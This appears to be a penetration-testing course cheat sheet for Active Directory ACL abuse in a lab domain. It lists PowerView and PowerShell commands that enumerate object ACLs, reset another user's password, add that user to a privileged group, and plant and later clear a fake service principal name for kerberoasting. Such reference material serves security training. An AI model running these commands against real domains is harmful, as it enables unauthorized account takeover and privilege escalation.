# ACL Enumeration & tactics

***

| Command                                                                                                                                                                                                                                                                                                | Description                                                                                                                                                                                                                                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Find-InterestingDomainAcl`                                                                                                                                                                                                                                                                            | PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.                                                                                                                 |
| `Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley`                                                                                                                                                                                                                                          | Used to import PowerView and retrieve the `SID` of a specific user account (`wley`) from a Windows-based host.                                                                                                                                                       |
| `Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}`                                                                                                                                                                                                                                | Used to find all Windows domain objects that the user has rights over by mapping the user's `SID` to the `SecurityIdentifier` property from a Windows-based host.                                                                                                    |
| `$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl` | Used to perform a reverse search & map to a `GUID` value from a Windows-based host.                                                                                                                                                                                  |
| `Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid}`                                                                                                                                                                                                                  | Used to discover a domain object's ACL by performing a search based on GUID's (`-ResolveGUIDs`) from a Windows-based host.                                                                                                                                           |
| `Get-ADUser -Filter * \| Select-Object -ExpandProperty SamAccountName > ad_users.txt`                                                                                                                                                                                                                  | Used to discover a group of user accounts in a target Windows domain and add the output to a text file (`ad_users.txt`) from a Windows-based host.                                                                                                                   |
| `foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" \| Select-Object Path -ExpandProperty Access \| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}`                                                      | A `foreach loop` used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(`ad_users.txt`) to the `Get-ADUser` cmdlet, then enumerates access rights of those users. Performed from a Windows-based host. |
| `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)`                                                                                                                         | Used to create a `PSCredential Object` from a Windows-based host.                                                                                                                                                                                                    |
| `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`                                                                                                                                                                                                                     | Used to create a `SecureString Object` from a Windows-based host.                                                                                                                                                                                                    |
| `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`                                                                                                                                                                                            | PowerView tool used to change the password of a specifc user (`damundsen`) on a target Windows domain from a Windows-based host.                                                                                                                                     |
| `Get-ADGroup -Identity "Help Desk Level 1" -Properties * \| Select -ExpandProperty Members`                                                                                                                                                                                                            | PowerView tool used view the members of a target security group (`Help Desk Level 1`) from a Windows-based host.                                                                                                                                                     |
| `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`                                                                                                                                                                                                 | PowerView tool used to add a specifc user (`damundsen`) to a specific security group (`Help Desk Level 1`) in a target Windows domain from a Windows-based host.                                                                                                     |
| `Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName`                                                                                                                                                                                                                             | PowerView tool used to view the members of a specific security group (`Help Desk Level 1`) and output only the username of each member (`Select MemberName`) of the group from a Windows-based host.                                                                 |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`                                                                                                                                                                                         | PowerView tool used create a fake `Service Principal Name` given a sepecift user (`adunn`) from a Windows-based host.                                                                                                                                                |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`                                                                                                                                                                                                             | PowerView tool used to remove the fake `Service Principal Name` created during the attack from a Windows-based host.                                                                                                                                                 |
| `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`                                                                                                                                                                                              | PowerView tool used to remove a specific user (`damundsent`) from a specific security group (`Help Desk Level 1`) from a Windows-based host.                                                                                                                         |
| `ConvertFrom-SddlString`                                                                                                                                                                                                                                                                               | PowerShell cmd-let used to covert an `SDDL string` into a readable format. Performed from a Windows-based host.                                                                                                                                                      |